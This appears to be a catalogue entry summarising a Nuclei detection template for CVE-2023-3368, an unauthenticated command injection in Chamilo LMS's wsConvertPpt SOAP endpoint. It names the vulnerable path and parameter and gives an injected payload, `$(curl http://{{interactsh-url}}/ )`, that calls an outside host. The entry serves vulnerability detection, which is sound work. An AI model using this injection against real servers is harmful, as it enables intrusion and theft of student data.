---
cve_id: CVE-2023-3368
template_path: nuclei-templates/http/cves/2023/CVE-2023-3368.yaml
affected_product: Chamilo LMS
severity: critical
authentication: none
external_callback: true
affected_versions: <= v1.11.20
preconditions: []
poc_classification: rce
---

## Vulnerability
Chamilo LMS <= v1.11.20 contains an unauthenticated command injection (CWE-78) in `/main/webservices/additional_webservices.php` via the `wsConvertPpt` SOAP endpoint. Improper neutralization of special characters in the `file_name` parameter allows injection of arbitrary OS commands. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). Unauthenticated remote attackers achieve full RCE, compromising the platform and accessing student data.

## PoC / Detection
Classification: rce

The template issues a single POST request to `{{BaseURL}}/main/webservices/additional_webservices.php` containing a crafted SOAP XML envelope. It injects the payload `$(curl http://{{interactsh-url}}/ )` into the `file_name` field under the `wsConvertPpt` method (with empty `file_data` and fixed `service_ppt2lp_size`). Success is confirmed by HTTP 200 status, presence of the string "wsConvertPptResponse" in the body, and an out-of-band HTTP interaction on the interactsh domain.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2023-3368
- https://starlabs.sg/advisories/23/23-3368/
- https://support.chamilo.org/projects/chamilo-18/wiki/security_issues#Issue-121-2023-07-05-Critical-impact-High-risk-Unauthenticated-Command-Injection-CVE-2023-3368
- https://github.com/chamilo/chamilo-lms/commit/37be9ce7243a30259047dd4517c48ff8b21d657a
- https://https://github.com/chamilo/chamilo-lms/commit/4c69b294f927db62092e01b70ac9bd6e32d5b48b
